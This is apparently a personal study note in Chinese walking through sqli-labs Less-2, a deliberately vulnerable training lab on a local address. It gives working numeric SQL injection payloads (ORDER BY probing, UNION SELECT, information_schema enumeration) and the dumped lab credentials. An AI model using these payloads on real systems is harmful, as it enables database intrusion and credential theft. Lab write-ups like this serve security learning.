---
title: less2
url: https://www.yuque.com/u29002979/ep2zrx/dady2k5mu2i7rd98
---

<a name="YstTA"></a>

# 查看源码

```bash
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

查看源码，参数没有闭合，说明为数字型注入。

<a name="t0fo6"></a>

# 找注入点

> http://192.168.31.193/Less-2/

Please input the ID as parameter with numeric value&#x20;
请输入ID作为带数值的参数
`?id=1 and 1=2 #`
1=2非真，页面就没有显示内容，说明数据被执行了。 <a name="FFdxf"></a>

# 判断字段

`?id=1 order by 4#`
Unknown column '4' in 'order clause'
“order子句”中的未知列“4”
`?id=1 order by 3#`
显示正常，说明有三列。 <a name="VgMOQ"></a>

# 找回显点

`?id=-1 union select 1,2,3#`
显示了2，3，说明2，3是回显点

<a name="RnFWy"></a>

# 开始注入

<a name="NpH7F"></a>

## 查看数据库名

`?id=-1 union select 1,2,group_concat(schema_name) from informaion_schema.schemata #`

> schema的复数:schemata

显示了数据库名称：
information\_schema,
challenges,
dvwa\_com,
mysql,
performance\_schema,
security,
sql,
sys <a name="oQxjF"></a>

## 查看数据表名称

`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#`

> where table\_schema=database()：查到本数据库的所有表名

显示数据表名称：
emails,
referers,
uagents,
users
查看users表字段名称
`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#`
显示字段名：
user\_id,
first\_name,
last\_name,
user,
password,
avatar,
last\_login,
failed\_login,
USER,
CURRENT\_CONNECTIONS,
TOTAL\_CONNECTIONS,
id,
username,
password <a name="GOQCD"></a>

## 查看字段内容

`?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)#`
用户名~密码
Dumb~Dumb,
Angelina~I kill-you,
Dummy~p@ssword,
secure~crappy,
stupid~stupidity,
superman~genious,
batman~mob!le,
admin~admin,
admin1~admin1,
admin2~admin2,
admin3~admin3,
dhakkan~dumbo,
admin4~admin4
